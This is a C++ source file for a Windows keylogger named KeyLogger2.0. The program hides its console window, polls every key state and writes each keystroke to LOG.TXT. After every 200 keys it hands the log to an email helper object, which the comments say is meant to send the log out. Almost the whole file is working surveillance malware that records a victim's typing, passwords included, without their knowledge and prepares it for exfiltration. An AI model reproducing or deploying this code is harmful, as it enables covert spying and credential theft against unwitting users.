// KeyLogger2.0.cpp : Defines the entry point for the console application.
//

#include<stdio.h>
#include<windows.h>
#include<Winuser.h>
#include<stdlib.h>
#include<iostream>
#include "myheader.h"
#include<string>
#include<fstream>

using namespace std;

int Save (int key, char *file);
void copyToString(char *file);
void clearLogFile(char *file);

char* str;
createMail cm;

int main()
{
	char i;
	int count=0;
/*   printf("This is my simple keylogger.");
   printf("\nloading... \n\n");
   system("color c");
   //copyToString("LOG.TXT");
	//clearLogFile("LOG.TXT");
	//system("pause");
	//return 1;
*/

	ShowWindow( GetConsoleWindow(), SW_HIDE );   
	clearLogFile("LOG.TXT");
   while(1)
   {
       for(i=8;i<=190;i++)
      {
          if(GetAsyncKeyState(i)==-32767)
          {    Save(i,"LOG.TXT");
			   count++;
			  if(count>=200){
				  count = 0;
				  cout<< "Count set to 0";
				  copyToString("LOG.TXT");
				  clearLogFile("LOG.TXT");
				  // transfer log.txt text into a char* _/
				  //pass that char* in setLogText._/
				  // Send email after setting the log text.
				  //make log.txt empty.
				  //
				  
			  }
        }	   
     }
   }
	return 0;
}

void copyToString(char *file){
	
   // Copies content of a file into a string. 

	std::ifstream ifs(file);
  std::string content( (std::istreambuf_iterator<char>(ifs) ),
                       (std::istreambuf_iterator<char>()    ) );

	char *array = &content[0];
	str = array;
   //display content
	cout  << str;

	//setLogText Called
	cm.setLogText(str);
	ifs.close();
}

void clearLogFile(char *file){
	FILE *ptr;
	ptr=fopen(file,"w");

	fclose(ptr);
}



int Save (int key,char *file)
{
if((key==1)||(key==2))
      return 0;

   FILE *ptr;
   ptr=fopen(file,"a+");
  //cout<<key_stroke<<endl;  // just in case //if you require to show key-strokes.
// You need to care about special characters. //Code below that will do it. :)
   if(key==8)
       fprintf(ptr,"%s","[BackSpace]");

   else if(key==13)
       fprintf(ptr,"%s","\n");

   else if(key==32)
       fprintf(ptr,"%s"," ");

   else if(key==VK_TAB)
       fprintf(ptr,"%s","[TAB]");

   else if(key==VK_SHIFT)
       fprintf(ptr,"%s","[SHIFT]");

   else if(key==VK_CONTROL)
       fprintf(ptr,"%s","[CONTROL]");

   else if(key==VK_ESCAPE)
       fprintf(ptr,"%s","[ESCAPE]");

   else if(key==VK_END)
       fprintf(ptr,"%s","[END]");

   else if(key==VK_HOME)
       fprintf(ptr,"%s","HOME");

   else if(key==VK_LEFT)
       fprintf(ptr,"%s","[LEFT]");

   else if(key==VK_UP)
       fprintf(ptr,"%s","[UP]");

   else if(key==VK_RIGHT)
       fprintf(ptr,"%s","[RIGHT]");

   else if(key==VK_DOWN)
       fprintf(ptr,"%s","[DOWN]");

   else if(key==190 || key==110)
       fprintf(ptr,"%s",".");

    else
       fprintf(ptr,"%s",&key);
   fclose(ptr);

   return 0;
}






